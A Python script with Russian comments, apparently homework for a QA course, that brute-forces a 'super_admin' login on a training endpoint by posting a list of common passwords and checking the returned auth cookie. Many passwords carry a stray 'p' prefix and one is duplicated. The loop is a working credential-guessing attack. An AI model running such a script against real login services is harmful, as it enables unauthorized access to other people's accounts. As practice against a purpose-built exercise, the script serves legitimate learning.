import requests
payload_list = [{"login":"super_admin", "password":"password"},
{"login":"super_admin", "password":"123456"},
{"login":"super_admin", "password":"123456789"},
{"login":"super_admin", "password":"12345678"},
{"login":"super_admin", "password":"p12345"},
{"login":"super_admin", "password":"qwerty"},
{"login":"super_admin", "password":"pabc123"},
{"login":"super_admin", "password":"football"},
{"login":"super_admin", "password":"p1234567"},
{"login":"super_admin", "password":"monkey"},
{"login":"super_admin", "password":"p111111"},
{"login":"super_admin", "password":"letmein"},
{"login":"super_admin", "password":"p1234"},
{"login":"super_admin", "password":"1234567890"},
{"login":"super_admin", "password":"pdragon"},
{"login":"super_admin", "password":"baseball"},
{"login":"super_admin", "password":"psunshine"},
{"login":"super_admin", "password":"iloveyou"},
{"login":"super_admin", "password":"ptrustno1"},
{"login":"super_admin", "password":"princess"},
{"login":"super_admin", "password":"padobe123"},
{"login":"super_admin", "password":"123123"},
{"login":"super_admin", "password":"pwelcome"},
{"login":"super_admin", "password":"login"},
{"login":"super_admin", "password":"padmin"},
{"login":"super_admin", "password":"qwerty123"},
{"login":"super_admin", "password":"psolo"},
{"login":"super_admin", "password":"1q2w3e4r"},
{"login":"super_admin", "password":"pmaster"},
{"login":"super_admin", "password":"pphotoshop"},
{"login":"super_admin", "password":"p666666"},
{"login":"super_admin", "password":"pphotoshop"},
{"login":"super_admin", "password":"p1qaz2wsx"},
{"login":"super_admin", "password":"pqwertyuiop"},
{"login":"super_admin", "password":"pashley"},
{"login":"super_admin", "password":"pmustang"},
{"login":"super_admin", "password":"p121212"},
{"login":"super_admin", "password":"pstarwars"},
{"login":"super_admin", "password":"p654321"},
{"login":"super_admin", "password":"pbailey"},
{"login":"super_admin", "password":"paccess"},
{"login":"super_admin", "password":"pflower"},
{"login":"super_admin", "password":"p555555"},
{"login":"super_admin", "password":"ppassw0rd"},
{"login":"super_admin", "password":"pshadow"},
{"login":"super_admin", "password":"plovely"},
{"login":"super_admin", "password":"p7777777"},
{"login":"super_admin", "password":"pmichael"},
{"login":"super_admin", "password":"p!@#$%^&*"},
{"login":"super_admin", "password":"pjesus"},
{"login":"super_admin", "password":"ppassword1"},
{"login":"super_admin", "password":"phello"},
{"login":"super_admin", "password":"pcharlie"},
{"login":"super_admin", "password":"p888888"},
{"login":"super_admin", "password":"psuperman"},
{"login":"super_admin", "password":"p696969"},
{"login":"super_admin", "password":"phottie"},
{"login":"super_admin", "password":"pfreedom"},
{"login":"super_admin", "password":"paa123456"},
{"login":"super_admin", "password":"pqazwsx"},
{"login":"super_admin", "password":"pninja"},
{"login":"super_admin", "password":"pazerty"},
{"login":"super_admin", "password":"ploveme"},
{"login":"super_admin", "password":"pwhatever"},
{"login":"super_admin", "password":"pdonald"},
{"login":"super_admin", "password":"pbatman"},
{"login":"super_admin", "password":"pzaq1zaq1"},
{"login":"super_admin", "password":"pFootball"},
{"login":"super_admin", "password":"p000000"},
{"login":"super_admin", "password":"p123qwe"}]
for payload in payload_list:
    #авторизация
    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    response = requests.post(url, data= payload)

    #сохраняем куку для проверки
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {'auth_cookie':cookie_value}

    print(response.url,response.text,response.status_code,response.cookies , sep = '\n')

    #проверка авторизации
    url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    response1 = requests.post(url, cookies=cookies)
    print(response1.url,response1.text,response1.status_code,response1.cookies , sep = '\n')
    message = response1.text
    if message == "You are NOT authorized":
        print("Пароль не верный " )
    else:
        print("Пароль верный! " + response1.text)